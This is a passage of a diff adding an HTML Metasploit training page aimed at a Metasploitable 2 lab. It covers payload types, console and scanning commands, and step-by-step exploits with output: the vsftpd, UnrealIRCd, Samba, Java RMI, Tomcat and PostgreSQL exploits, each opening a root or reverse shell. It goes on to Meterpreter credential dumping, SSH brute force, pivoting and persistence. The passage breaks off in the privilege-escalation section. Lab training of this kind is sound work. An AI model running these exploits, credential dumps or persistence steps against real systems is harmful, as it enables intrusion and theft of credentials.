+<span class="comment"># Platform   Arch     Connection Type</span>
+
+<span class="highlight">windows</span>/<span class="info">x64</span>/<span class="success">meterpreter/reverse_https</span>
+<span class="comment"># Staged meterpreter over HTTPS (stealthier)</span>
+
+<span class="highlight">linux</span>/<span class="info">x86</span>/<span class="success">meterpreter/reverse_tcp</span>
+<span class="comment"># Most common — Meterpreter reverse TCP shell</span>
+
+<span class="highlight">java</span>/<span class="success">jsp_shell_reverse_tcp</span>
+<span class="comment"># Java platform — useful for Tomcat exploits</span>
+
+<span class="comment"># REVERSE vs BIND:</span>
+<span class="comment"># reverse_tcp — target connects back to attacker (bypasses most firewalls)</span>
+<span class="comment"># bind_tcp   — attacker connects to target (target opens port)</span>
+      </div>
+    </div>
+
+    <h2>Exploit Reliability Ranks</h2>
+    <table class="data-table">
+      <tr><th>RANK</th><th>DESCRIPTION</th><th>EXAMPLE</th></tr>
+      <tr><td><span class="success">ExcellentRanking</span></td><td>Will never crash the service, works reliably 100%</td><td>vsftpd backdoor</td></tr>
+      <tr><td><span class="info">GreatRanking</span></td><td>Has a default target, auto-detects OS</td><td>MS17-010 EternalBlue</td></tr>
+      <tr><td><span class="highlight">GoodRanking</span></td><td>Works on default config, no crash risk</td><td>Samba usermap_script</td></tr>
+      <tr><td><span class="output">NormalRanking</span></td><td>Reliable but may require specific version</td><td>Most exploits</td></tr>
+      <tr><td><span style="color:#ff9f43">AverageRanking</span></td><td>May fail or crash — test carefully</td><td>Heap overflows</td></tr>
+      <tr><td><span class="error-text">LowRanking</span></td><td>Almost always crashes, very specific conditions</td><td>Unstable browser bugs</td></tr>
+    </table>
+  </section>
+
+  <!-- ─── SECTION 4: COMMANDS ─── -->
+  <section id="commands" class="section">
+    <div class="section-header">
+      <div class="section-icon">⌨</div>
+      <div>
+        <div class="section-title">CORE COMMANDS</div>
+        <div class="section-desc">msfconsole navigation, workspaces, search, modules</div>
+      </div>
+    </div>
+
+    <h2>msfconsole Navigation</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Essential Console Commands</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># ── HELP & INFO ──────────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">help</span>                     <span class="comment"># Show all commands</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">help &lt;command&gt;</span>           <span class="comment"># Specific command help</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">version</span>                  <span class="comment"># Framework version</span>
+
+<span class="comment"># ── WORKSPACES ───────────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">workspace</span>                <span class="comment"># List workspaces</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">workspace -a metasploitable</span>  <span class="comment"># Create workspace</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">workspace metasploitable</span> <span class="comment"># Switch workspace</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">workspace -d oldproject</span> <span class="comment"># Delete workspace</span>
+
+<span class="comment"># ── SEARCHING MODULES ────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">search vsftpd</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">search type:exploit platform:linux</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">search cve:2021-44228</span>      <span class="comment"># Search by CVE</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">search name:eternalblue</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">search rank:excellent type:exploit</span>
+
+<span class="comment"># ── USING A MODULE ───────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">info</span>   <span class="comment"># Module details</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">show options</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">show payloads</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">show targets</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">show advanced</span>
+
+<span class="comment"># ── SETTING OPTIONS ──────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set RPORT 21</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set PAYLOAD linux/x86/shell_reverse_tcp</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">setg LHOST 192.168.56.101</span>  <span class="comment"># Global — persists</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">unset PAYLOAD</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">unsetg LHOST</span>
+
+<span class="comment"># ── RUNNING ──────────────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">run</span>                       <span class="comment"># Execute (same as exploit)</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">exploit -j</span>               <span class="comment"># Run as background job</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">check</span>                     <span class="comment"># Check if target is vulnerable</span>
+
+<span class="comment"># ── SESSIONS ─────────────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">sessions</span>                  <span class="comment"># List all sessions</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">sessions -i 1</span>            <span class="comment"># Interact with session 1</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">sessions -k 1</span>            <span class="comment"># Kill session 1</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">sessions -u 1</span>            <span class="comment"># Upgrade shell to meterpreter</span>
+
+<span class="comment"># ── DATABASE ─────────────────────────────────</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">hosts</span>                     <span class="comment"># Discovered hosts</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">services</span>                  <span class="comment"># Discovered services</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">vulns</span>                     <span class="comment"># Known vulnerabilities</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">creds</span>                     <span class="comment"># Captured credentials</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">loot</span>                      <span class="comment"># Collected loot</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── SECTION 5: SCANNING ─── -->
+  <section id="scanning" class="section">
+    <div class="section-header">
+      <div class="section-icon">🔍</div>
+      <div>
+        <div class="section-title">SCANNING & ENUMERATION</div>
+        <div class="section-desc">Discover targets, open ports, services, and vulnerabilities</div>
+      </div>
+    </div>
+
+    <h2>Nmap Integration with MSF</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">db_nmap — Scan and store results directly in database</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># Always scan to the database with db_nmap</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">db_nmap -sV -sC -O 192.168.56.102</span>
+<span class="comment"># -sV   = service version detection</span>
+<span class="comment"># -sC   = run default scripts</span>
+<span class="comment"># -O    = OS detection</span>
+
+<span class="prompt">msf6 &gt;</span> <span class="cmd">db_nmap -p- --min-rate 5000 -sV 192.168.56.102</span>
+<span class="comment"># -p-   = all 65535 ports</span>
+<span class="comment"># --min-rate = speed up scan</span>
+
+<span class="prompt">msf6 &gt;</span> <span class="cmd">db_nmap -sU --top-ports 200 192.168.56.102</span>
+<span class="comment"># -sU   = UDP scan (slower but critical)</span>
+
+<span class="comment"># View results stored in the database</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">hosts</span>
+<span class="output">Hosts</span>
+<span class="output">====</span>
+<span class="output">address          mac  name  os_name  os_flavor  os_sp  purpose</span>
+<span class="output">-------          ---  ----  -------  ---------  -----  -------</span>
+<span class="output">192.168.56.102        metasploitable Linux  Ubuntu  2.6.X  server</span>
+
+<span class="prompt">msf6 &gt;</span> <span class="cmd">services -p 21,22,80,3306</span>
+<span class="comment"># Filter services by port</span>
+
+<span class="prompt">msf6 &gt;</span> <span class="cmd">services -S vsftpd</span>
+<span class="comment"># Filter by name string</span>
+      </div>
+    </div>
+
+    <h2>Metasploitable 2 — Open Ports & Services</h2>
+    <table class="data-table">
+      <tr><th>PORT</th><th>SERVICE</th><th>VERSION</th><th>KNOWN VULNERABILITY</th></tr>
+      <tr><td class="port">21</td><td class="service">FTP</td><td>vsftpd 2.3.4</td><td class="vuln">Backdoor command execution</td></tr>
+      <tr><td class="port">22</td><td class="service">SSH</td><td>OpenSSH 4.7p1</td><td class="vuln">Weak credentials: msfadmin/msfadmin</td></tr>
+      <tr><td class="port">23</td><td class="service">Telnet</td><td>Linux telnetd</td><td class="vuln">Cleartext auth, default creds</td></tr>
+      <tr><td class="port">25</td><td class="service">SMTP</td><td>Postfix</td><td class="vuln">User enumeration via VRFY</td></tr>
+      <tr><td class="port">80</td><td class="service">HTTP</td><td>Apache 2.2.8</td><td class="vuln">Multiple vulnerable web apps (DVWA, Mutillidae)</td></tr>
+      <tr><td class="port">111</td><td class="service">RPC</td><td>rpcbind 2</td><td class="vuln">Info disclosure, pivoting</td></tr>
+      <tr><td class="port">139/445</td><td class="service">Samba</td><td>3.0.20</td><td class="vuln">usermap_script RCE (CVE-2007-2447)</td></tr>
+      <tr><td class="port">512-514</td><td class="service">R-Services</td><td>rsh, rexec, rlogin</td><td class="vuln">No authentication by default</td></tr>
+      <tr><td class="port">1099</td><td class="service">Java RMI</td><td>Java RMI Registry</td><td class="vuln">Remote code execution</td></tr>
+      <tr><td class="port">1524</td><td class="service">Bindshell</td><td>Metasploitable root shell</td><td class="vuln">Direct root shell (backdoor)</td></tr>
+      <tr><td class="port">2049</td><td class="service">NFS</td><td>nfs 2-4</td><td class="vuln">World-writable shares</td></tr>
+      <tr><td class="port">3306</td><td class="service">MySQL</td><td>5.0.51a</td><td class="vuln">No root password, remote root login</td></tr>
+      <tr><td class="port">5432</td><td class="service">PostgreSQL</td><td>8.3.0-8.3.7</td><td class="vuln">Default creds, OS command injection</td></tr>
+      <tr><td class="port">5900</td><td class="service">VNC</td><td>VNC 3.3</td><td class="vuln">Password: "password"</td></tr>
+      <tr><td class="port">6667</td><td class="service">IRC</td><td>UnrealIRCd 3.2.8.1</td><td class="vuln">Backdoor command execution</td></tr>
+      <tr><td class="port">8180</td><td class="service">HTTP-alt</td><td>Apache Tomcat 5.5</td><td class="vuln">Default manager creds → WAR upload</td></tr>
+    </table>
+
+    <h2>Key Auxiliary Scanners</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Targeted Enumeration Modules</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># SMB Version & Share Enumeration</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/smb/smb_version</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/smb/smb_enumshares</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/smb/smb_enumusers</span>
+
+<span class="comment"># SSH Brute Force</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/ssh/ssh_login</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set USERNAME msfadmin</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set PASS_FILE /usr/share/wordlists/rockyou.txt</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">run</span>
+
+<span class="comment"># HTTP Directory Enumeration</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/http/dir_scanner</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/http/http_version</span>
+
+<span class="comment"># MySQL Enumeration</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/mysql/mysql_version</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/admin/mysql/mysql_sql</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/mysql/mysql_login</span>
+
+<span class="comment"># VNC Authentication Scanner</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/vnc/vnc_login</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set PASS_FILE /usr/share/wordlists/metasploit/vnc_passwords.txt</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── SECTION 6: EXPLOITATION ─── -->
+  <section id="exploits" class="section">
+    <div class="section-header">
+      <div class="section-icon">💥</div>
+      <div>
+        <div class="section-title">EXPLOITATION TECHNIQUES</div>
+        <div class="section-desc">Step-by-step exploits against Metasploitable 2 vulnerabilities</div>
+      </div>
+    </div>
+
+    <div class="info-box note">
+      <strong>ℹ LAB TARGET</strong>
+      All examples below target Metasploitable 2 at 192.168.56.102. Replace with your actual target IP. Run these ONLY in your isolated lab.
+    </div>
+
+    <!-- EXPLOIT 1 -->
+    <div class="exploit-card">
+      <div class="exploit-header" onclick="toggleExploit(this)">
+        <span class="exploit-rank rank-excellent">EXCELLENT</span>
+        <span class="exploit-name">vsftpd 2.3.4 Backdoor — Port 21</span>
+        <span class="exploit-cve">CVE-2011-2523</span>
+        <span style="margin-left:8px;color:var(--text-dim);font-size:18px">▼</span>
+      </div>
+      <div class="exploit-body">
+        <p>A malicious backdoor was introduced into the vsftpd 2.3.4 source code. When a username ending with ":)" is sent, a bind shell is opened on port 6200. This is one of the most famous supply-chain attacks in open source history.</p>
+        <div class="terminal">
+          <div class="terminal-body">
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 exploit(vsftpd_234_backdoor) &gt;</span> <span class="cmd">run</span>
+<span class="output">[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="output">[*] 192.168.56.102:21 - USER: 331 Please specify the password.</span>
+<span class="success">[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...</span>
+<span class="success">[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)</span>
+<span class="success">[*] Found shell.</span>
+<span class="success">[*] Command shell session 1 opened</span>
+<span class="prompt">id</span>
+<span class="success">uid=0(root) gid=0(root) groups=0(root)</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXPLOIT 2 -->
+    <div class="exploit-card">
+      <div class="exploit-header" onclick="toggleExploit(this)">
+        <span class="exploit-rank rank-excellent">EXCELLENT</span>
+        <span class="exploit-name">Samba "Username Map Script" RCE — Port 445</span>
+        <span class="exploit-cve">CVE-2007-2447</span>
+        <span style="margin-left:8px;color:var(--text-dim);font-size:18px">▼</span>
+      </div>
+      <div class="exploit-body">
+        <p>A vulnerability in Samba 3.0.20–3.0.25rc3 allows remote command injection via the username field when using the "username map script" option. An attacker can execute arbitrary commands as the daemon user (typically root).</p>
+        <div class="terminal">
+          <div class="terminal-body">
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/multi/samba/usermap_script</span>
+<span class="prompt">msf6 exploit(usermap_script) &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 exploit(usermap_script) &gt;</span> <span class="cmd">set PAYLOAD cmd/unix/reverse</span>
+<span class="prompt">msf6 exploit(usermap_script) &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 exploit(usermap_script) &gt;</span> <span class="cmd">run</span>
+<span class="output">[*] Started reverse TCP double handler on 192.168.56.101:4444</span>
+<span class="success">[*] Accepted the first client connection...</span>
+<span class="success">[*] Command shell session 1 opened</span>
+<span class="prompt">whoami</span>
+<span class="success">root</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXPLOIT 3 -->
+    <div class="exploit-card">
+      <div class="exploit-header" onclick="toggleExploit(this)">
+        <span class="exploit-rank rank-excellent">EXCELLENT</span>
+        <span class="exploit-name">UnrealIRCd Backdoor — Port 6667</span>
+        <span class="exploit-cve">CVE-2010-2075</span>
+        <span style="margin-left:8px;color:var(--text-dim);font-size:18px">▼</span>
+      </div>
+      <div class="exploit-body">
+        <p>UnrealIRCd 3.2.8.1 contained a backdoor in its distribution archive. The backdoor allows execution of arbitrary commands by sending "AB;" to the server, then the command string followed by a newline.</p>
+        <div class="terminal">
+          <div class="terminal-body">
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/unix/irc/unreal_ircd_3281_backdoor</span>
+<span class="prompt">msf6 exploit(unreal_ircd_3281_backdoor) &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 exploit(unreal_ircd_3281_backdoor) &gt;</span> <span class="cmd">set PAYLOAD cmd/unix/reverse</span>
+<span class="prompt">msf6 exploit(unreal_ircd_3281_backdoor) &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 exploit(unreal_ircd_3281_backdoor) &gt;</span> <span class="cmd">run</span>
+<span class="success">[*] Command shell session 2 opened</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXPLOIT 4 -->
+    <div class="exploit-card">
+      <div class="exploit-header" onclick="toggleExploit(this)">
+        <span class="exploit-rank rank-great">GREAT</span>
+        <span class="exploit-name">Java RMI Server — Port 1099</span>
+        <span class="exploit-cve">CVE-2011-3556</span>
+        <span style="margin-left:8px;color:var(--text-dim);font-size:18px">▼</span>
+      </div>
+      <div class="exploit-body">
+        <p>The Java RMI Registry allows remote class loading by default in older JDKs. An attacker can exploit this to load a malicious codebase URL and execute arbitrary code on the target system.</p>
+        <div class="terminal">
+          <div class="terminal-body">
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/multi/misc/java_rmi_server</span>
+<span class="prompt">msf6 exploit(java_rmi_server) &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 exploit(java_rmi_server) &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 exploit(java_rmi_server) &gt;</span> <span class="cmd">set PAYLOAD java/meterpreter/reverse_tcp</span>
+<span class="prompt">msf6 exploit(java_rmi_server) &gt;</span> <span class="cmd">run</span>
+<span class="success">[*] Meterpreter session 3 opened</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXPLOIT 5 -->
+    <div class="exploit-card">
+      <div class="exploit-header" onclick="toggleExploit(this)">
+        <span class="exploit-rank rank-excellent">EXCELLENT</span>
+        <span class="exploit-name">Tomcat Manager WAR Upload — Port 8180</span>
+        <span class="exploit-cve">Misconfiguration</span>
+        <span style="margin-left:8px;color:var(--text-dim);font-size:18px">▼</span>
+      </div>
+      <div class="exploit-body">
+        <p>Apache Tomcat's Manager application allows deploying WAR (Web Application Archive) files. With default credentials (tomcat/tomcat), an attacker can upload a malicious WAR containing a JSP shell.</p>
+        <div class="terminal">
+          <div class="terminal-body">
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/multi/http/tomcat_mgr_upload</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">set RPORT 8180</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">set HttpUsername tomcat</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">set HttpPassword tomcat</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">set PAYLOAD java/meterpreter/reverse_tcp</span>
+<span class="prompt">msf6 exploit(tomcat_mgr_upload) &gt;</span> <span class="cmd">run</span>
+<span class="success">[*] Meterpreter session 4 opened</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXPLOIT 6 -->
+    <div class="exploit-card">
+      <div class="exploit-header" onclick="toggleExploit(this)">
+        <span class="exploit-rank rank-excellent">EXCELLENT</span>
+        <span class="exploit-name">PostgreSQL OS Command Injection — Port 5432</span>
+        <span class="exploit-cve">Misconfiguration</span>
+        <span style="margin-left:8px;color:var(--text-dim);font-size:18px">▼</span>
+      </div>
+      <div class="exploit-body">
+        <p>PostgreSQL on Metasploitable 2 accepts connections from any IP with default credentials (postgres/postgres). The COPY TO/FROM PROGRAM function allows arbitrary OS command execution as the postgres user.</p>
+        <div class="terminal">
+          <div class="terminal-body">
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/linux/postgres/postgres_payload</span>
+<span class="prompt">msf6 exploit(postgres_payload) &gt;</span> <span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="prompt">msf6 exploit(postgres_payload) &gt;</span> <span class="cmd">set USERNAME postgres</span>
+<span class="prompt">msf6 exploit(postgres_payload) &gt;</span> <span class="cmd">set PASSWORD postgres</span>
+<span class="prompt">msf6 exploit(postgres_payload) &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 exploit(postgres_payload) &gt;</span> <span class="cmd">run</span>
+<span class="success">[*] Meterpreter session 5 opened</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── SECTION 7: METERPRETER ─── -->
+  <section id="meterpreter" class="section">
+    <div class="section-header">
+      <div class="section-icon">🔮</div>
+      <div>
+        <div class="section-title">METERPRETER DEEP DIVE</div>
+        <div class="section-desc">The most powerful payload — commands, features, extensions</div>
+      </div>
+    </div>
+
+    <p>Meterpreter (Meta-Interpreter) is an advanced, dynamically extensible payload that lives entirely in memory, never touching the disk. It uses encrypted communications, supports channel multiplexing, and can load extensions on demand. It's the go-to payload for post-exploitation.</p>
+
+    <div class="info-box tip">
+      <strong>✓ PRO TIP: UPGRADE TO METERPRETER</strong>
+      Have a plain shell? Upgrade it: <code>sessions -u &lt;ID&gt;</code> or use <code>post/multi/manage/shell_to_meterpreter</code> module.
+    </div>
+
+    <h2>Core Meterpreter Commands</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Meterpreter Session Commands</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># ── SYSTEM INFORMATION ───────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">sysinfo</span>              <span class="comment"># OS, hostname, arch, domain</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">getuid</span>               <span class="comment"># Current user</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">getpid</span>               <span class="comment"># Current process ID</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">ps</span>                   <span class="comment"># List running processes</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">migrate 1234</span>         <span class="comment"># Migrate to PID 1234</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">env</span>                  <span class="comment"># Environment variables</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">ifconfig</span>             <span class="comment"># Network interfaces</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">route</span>                <span class="comment"># Routing table</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">arp</span>                  <span class="comment"># ARP table</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">netstat</span>              <span class="comment"># Network connections</span>
+
+<span class="comment"># ── FILE SYSTEM ──────────────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">pwd</span>                  <span class="comment"># Current directory</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">ls</span>                   <span class="comment"># List files</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">cd /etc</span>              <span class="comment"># Change directory</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">cat /etc/passwd</span>      <span class="comment"># Read file</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">download /etc/shadow /tmp/shadow</span>   <span class="comment"># Download file</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">upload /tmp/tool /tmp/tool</span>        <span class="comment"># Upload file</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">search -f *.txt -d /home</span>          <span class="comment"># Search files</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">edit /etc/hosts</span>      <span class="comment"># Edit file in vim</span>
+
+<span class="comment"># ── PRIVILEGE ESCALATION ─────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">getsystem</span>            <span class="comment"># Attempt to get SYSTEM (Windows)</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">getprivs</span>             <span class="comment"># List enabled privileges</span>
+
+<span class="comment"># ── CREDENTIALS ──────────────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">hashdump</span>             <span class="comment"># Dump /etc/shadow or SAM hashes</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">run post/linux/gather/hashdump</span>
+
+<span class="comment"># ── SHELL ────────────────────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">shell</span>                <span class="comment"># Drop to system shell</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">execute -f /bin/sh -i</span>   <span class="comment"># Execute command interactively</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">execute -H -f cmd /c whoami</span>  <span class="comment"># Hidden execution</span>
+
+<span class="comment"># ── PIVOTING & TUNNELING ─────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">portfwd add -l 3389 -p 3389 -r 10.0.0.5</span>
+<span class="comment"># Forward local 3389 → target network host:3389</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">run post/multi/manage/autoroute</span>
+<span class="comment"># Add routes to unreachable subnets</span>
+
+<span class="comment"># ── BACKGROUND / CONTROL ─────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">background</span>           <span class="comment"># Send to background (Ctrl+Z)</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">help</span>                 <span class="comment"># Full command list</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">exit</span>                 <span class="comment"># Close session</span>
+
+<span class="comment"># ── PERSISTENCE (Linux) ──────────────────────</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">run post/linux/manage/sshkey_persistence</span>
+<span class="comment"># Adds SSH key for re-entry without exploit</span>
+      </div>
+    </div>
+
+    <h2>Meterpreter Extensions</h2>
+    <div class="grid grid-2">
+      <div class="card blue">
+        <div class="card-num">EXTENSION</div>
+        <h3>Stdapi (Default)</h3>
+        <p>Loaded by default. Provides all file system, networking, process, and system commands. The foundation of all Meterpreter sessions.</p>
+      </div>
+      <div class="card">
+        <div class="card-num">EXTENSION</div>
+        <h3>Priv</h3>
+        <p>Privilege escalation features. Load with <code>load priv</code>. Provides <code>getsystem</code>, <code>hashdump</code> and local priv-esc techniques on Windows.</p>
+      </div>
+      <div class="card yellow">
+        <div class="card-num">EXTENSION</div>
+        <h3>Kiwi (Mimikatz)</h3>
+        <p>Windows credential dumping. Load with <code>load kiwi</code>. Then use <code>creds_all</code>, <code>lsa_dump_sam</code>, <code>wifi_list</code>. Requires SYSTEM privileges.</p>
+      </div>
+      <div class="card red">
+        <div class="card-num">EXTENSION</div>
+        <h3>Sniffer</h3>
+        <p>Network packet capture from the target. <code>load sniffer</code> → <code>sniffer_start 1</code> → <code>sniffer_dump 1 /tmp/cap.pcap</code>. Analyze with Wireshark.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── SECTION 8: POST-EXPLOITATION ─── -->
+  <section id="postexploit" class="section">
+    <div class="section-header">
+      <div class="section-icon">🕸</div>
+      <div>
+        <div class="section-title">POST-EXPLOITATION</div>
+        <div class="section-desc">Privilege escalation, pivoting, persistence, and lateral movement</div>
+      </div>
+    </div>
+
+    <h2>Linux Privilege Escalation with MSF</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Local Exploit Suggester → Escalate to Root</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># Step 1: Background your meterpreter session</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">background</span>
+<span class="output">[*] Backgrounding session 1...</span>
+
+<span class="comment"># Step 2: Run Local Exploit Suggester</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use post/multi/recon/local_exploit_suggester</span>
+<span class="prompt">msf6 post(local_exploit_suggester) &gt;</span> <span class="cmd">set SESSION 1</span>
+<span class="prompt">msf6 post(local_exploit_suggester) &gt;</span> <span class="cmd">run</span>
+<span class="output">[*] Collecting local exploits for linux/x86...</span>
+<span class="success">[+] exploit/linux/local/udev_netlink — The target appears to be vulnerable</span>
